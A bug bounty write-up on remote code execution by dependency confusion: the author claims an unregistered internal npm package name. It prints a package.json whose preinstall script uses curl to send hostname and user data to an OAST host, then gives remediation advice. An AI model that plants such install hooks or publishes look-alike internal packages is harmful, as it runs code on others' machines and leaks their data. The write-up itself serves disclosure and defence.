
# 💥 $2,500 Bug Bounty Write-Up: RCE via Unclaimed Node Package

**Author:** Fuleki Ioan  
**Vulnerability Type:** Remote Code Execution (RCE)  
**Exploit Technique:** Dependency Confusion  
**Reward:** $2,500  
**Write-Up Date:** Sep 2024  
**Original Post:** [Medium Article](https://medium.com/@p0lyxena/2-500-bug-bounty-write-up-remote-code-execution-rce-via-unclaimed-node-package-6b9108d10643)

---

## Discovery: Clue in the Source Code

While reviewing JavaScript code from the target, the author observed this suspicious require statement:

```js
require("@confidential-company/package-name");
```

- This indicated a **scoped internal package**.
- The package was **not available on npmjs.com**, suggesting it might only exist in the company’s private registry.

---

## Vulnerability: Dependency Confusion
**Dependency Confusion** happens when:

1. A developer references a private/internal package in source code.
2. The package manager (like `npm`) is configured to pull from both internal and public registries.
3. If the internal package is **not published to the public registry**, an attacker can **publish a malicious version with the same name**.
4. During `npm install`, **the malicious version may be installed**, leading to **code execution** on the target’s CI/CD or dev machines.

### In This Case:

- The package `@confidential-company/package-name` was **unclaimed on npm**.
- The author **registered it on npm** and inserted a **malicious preinstall script**.

---

## Exploit Code: Malicious `package.json`

![alt text](/imgs/RCEViaUnClaimedNodePackage1.png)

The attacker published the following package:

```json
{
  "name": "@confidential-company/package-name",
  "version": "1.0.0",
  "description": "internal module",
  "scripts": {
    "preinstall": "curl --data-urlencode \"info=$(hostname && whoami)\" http://attacker.oast.fun"
  }
}
```

This sends sensitive environment info (hostname + user) to a **Burp Collaborator/OAST** server on install.

---

## Execution: Detecting the Impact

- Once the package was published, **HTTP and DNS requests flooded in** from multiple environments.
- The requests included:
  - Hostnames
  - Usernames
  - IP addresses

This confirmed that the package was **being installed on actual production/dev machines** of the company.

![alt text](/imgs/RCEViaUnClaimedNodePackage2.png)

![alt text](/imgs/RCEViaUnClaimedNodePackage3.png)

---

## Report & Bounty

- The researcher captured **over 150 events**.
- Filtered bot traffic and identified **real IPs tied to company infrastructure**.
- Reported immediately through the responsible disclosure program.
- Within 7 days: Triaged, validated, and awarded the maximum bounty of **$2,500**.

---

## Lessons & Remediation

### How to Prevent Dependency Confusion:

1. **Always publish all internal packages (even empty) to public registries** to block malicious claims.
2. **Lock package registries** using `.npmrc`:
   ```ini
   registry=https://registry.internal.company/
   ```
3. **Use scoped registries** (`@scope`) and enforce install rules.
4. **Audit dependency sources** regularly.

---

## Conclusion

This case illustrates how **a single unclaimed package name** can lead to **full remote code execution** across an organization's infrastructure. Dependency Confusion remains one of the **most overlooked but devastating vulnerabilities** in modern development pipelines.

